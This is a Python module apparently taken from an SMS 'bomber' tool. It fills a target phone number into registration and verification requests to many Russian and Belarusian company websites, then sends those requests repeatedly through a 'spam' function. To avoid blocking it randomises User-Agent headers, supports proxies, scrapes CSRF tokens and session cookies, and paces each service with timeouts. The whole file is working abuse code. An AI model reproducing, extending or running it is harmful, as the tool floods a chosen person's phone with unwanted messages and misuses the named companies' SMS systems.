import json
import time
import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# services list
services_list = []
services_list_by = []
with open('tools/services.json') as f:
    services = json.load(f)
    services_ru = services['ru'][0]
    for i in services_ru:
        services_list.append(i)

    services_by = services['by'][0]
    for i in services_by:
        services_list_by.append(i)

class Send:
    def parse(self):
        services_list = []
        response_services = {}
        time_out_ = {}
        time_out_config = {}
        cookie = {}
        # load json
        with open('tools/services.json') as f:
            services = json.load(f)
        services = services[self.country][0]
        # services list
        for i in services:
            services_list.append(i)
        # response services
        for i in services:
            response_services[i] = services[i]["response"]
        # time_out countdown
        for i in services:
            time_out_[i] = 0
        # time_out services
        for i in services:
            time_out_config[i] = services[i]["timeout"] + 5
        # cookies services
        for i in services:
            if "cookies" in services[i]:
                cookie[i] = services[i]["cookies"]
        return services_list, response_services, time_out_, time_out_config, cookie

    def __init__(self, country):
        self.country = country
        self.services_list, self.response_services, self.time_out_, self.time_out_config, self.cookie = self.parse()
        self.service = None
        self.service_data = None
        self.services = None
        self.default_headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				                'Accept-Encoding': 'gzip, deflate, br',
				                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
				                'Cache-Control': 'no-cache',
				                'Connection': 'keep-alive',
				                'User-Agent': None}

    def checktimeout(self, service):
        time_out_ = self.time_out_
        time_out_config = self.time_out_config
        if time_out_[service] == 0:
            time_out_[service] = time.time()
            return True
        else:
            old_time = time_out_[service]
            now_time = time.time()
            try:
                if now_time - old_time >= time_out_config[service]:
                    time_out_[service] = time.time()
                    return True
                else:
                    return False
            except:
                print('error: something went wrong (perhaps the required service is not in the config)')
                return False

    def json_parse(self, payload, datatype, country, phone):
        # formatting for Russia
        if country == 'ru':
            for old, new in {
                "'": '"',
                "*+phone*": phone[0],
                "*phone*": phone[1],
                "*phone8*": phone[2],
                "*phone()*": phone[3],
                "*phone2*": phone[4],
                "*phone3*": phone[5],
                "*mtfree*": phone[6],
                "*-phone*": phone[7]
            }.items():
                if old in payload:
                    payload = payload.replace(old, new)
            return datatype, payload
        # formatting for Belarus
        elif country == 'by':
            for old, new in {
                "'": '"',
                "*+phone*": phone[0],
                "*phone*": phone[1],
                "*-phone*": phone[2],
                "*green*": phone[3],
                "*sosedi*": phone[4]
            }.items():
                if old in payload:
                    payload = payload.replace(old, new)
            return datatype, payload

    # json processing for subsequent spam
    def json_processing(self, phone):
        # check country
        if phone[1][:1] == '3':
            country = "by"
        else:
            country = "ru"

        # load json
        with open('tools/services.json', encoding="utf-8") as f:
            services = json.load(f)
        # Getting services by country
        self.services = services[country][0]
        try:
            service = self.services[self.service]
        except: # If the required service was not in json
            return False, False
        self.service_data = service

        if "json" in service: # If the required service was not in json
            payload = service["json"]
            datatype = 'json'
        elif "data" in service: # If the required service was not in data
            payload = service["data"]
            datatype = 'data'
        else:
            return self.json_parse(service["url"], "url", country, phone)

        payload, datatype = self.json_parse(payload, datatype, country, phone)

        # Checking if the url needs to be changed
        if '*' in service["url"]:
            data = [True, (self.json_parse(service["url"], "url", country, phone)), (payload, datatype)] # (True(with change in url) or False; (payload, "url") - if True, (payload, "json or data"))
            return data
        else:
            data = [False, (payload, datatype)]
            return data


    # Spam function
    def spam(self, service, phone, proxy=None):
        self.service = service

        payloadUrl = ''
        if self.json_processing(phone) != False:
            try:
                if self.json_processing(phone)[0] == True:
                    payloadUrl = self.json_processing(phone)[1][1]
                    datatype, payload = self.json_processing(phone)[2]
                else:
                    datatype, payload = self.json_processing(phone)[1]
            except: # If only url is passed
                datatype = "url"
                payloadUrl = self.json_processing(phone)[1]
        else: # If the service is not in json
            return False, False

        # service data
        service = self.service_data
        if payloadUrl != '':
            url = payloadUrl
        else:
            url = service["url"]

        # generate headers
        ua = UserAgent().random
        try:
            service["headers"]["User-Agent"] = ua
            headers = service["headers"]
        except:
            headers = self.default_headers
            headers['User-Agent'] = ua

        session = requests.Session()

        # Getting site cookies (if needed)
        cookies = None
        try:
            if self.service in self.cookie:
                cookies = session.get(self.cookie[self.service], headers=headers, timeout=10).cookies
        except:
            return False, False

        # fill out the request
        json_ = None
        data = None
        if datatype == "json":
            json_ = json.loads(payload)
        elif datatype == "data":
            data = json.loads(payload)
        elif self.service == "victoria":
            json_ = {"parameter": "{\"MobilePhone\":\"" + phone[0] + "\",\"CardNumber\":null,\"AgreeToTerms\":1,\"AllowNotification\":1}"}

        # send a request
        try:
            if self.service == 'pochtabank':
                session.post('https://my.pochtabank.ru/dbo/registrationService/ib', timeout=10)
                r = session.put(url, json=json_, timeout=10, proxies=proxy)
            elif self.service == "zdesapteka":
                ses_id = cookies["PHPSESSID"]
                data['sessid'] = ses_id
                r = session.post(url, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
            elif self.service == "stockmann":
                r = requests.get(url, timeout=10, proxies=proxy, headers=headers)
            elif self.service == "green":
                site = session.get(self.cookie["green"], headers=self.default_headers, timeout=10).text # parse token
                soup = BeautifulSoup(site, "html.parser")
                head = soup.find("head")
                a = []
                for i in head:
                    a.append(i)
                token = str(a[7]).split('"')[1]
                headers["X-CSRF-TOKEN"] = token
                r = session.post(url, data, headers=headers, timeout=10, proxies=proxy)
            else:
                r = session.post(url, json=json_, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
            if self.response_services[self.service] == "json":
                return r.status_code, r.json()
            else:
                if r.status_code == self.response_services[self.service]:
                    return 200, r.text
                else:
                    return r.status_code, r.text
        except:
            return False, False # https://t.me/orion_bomber
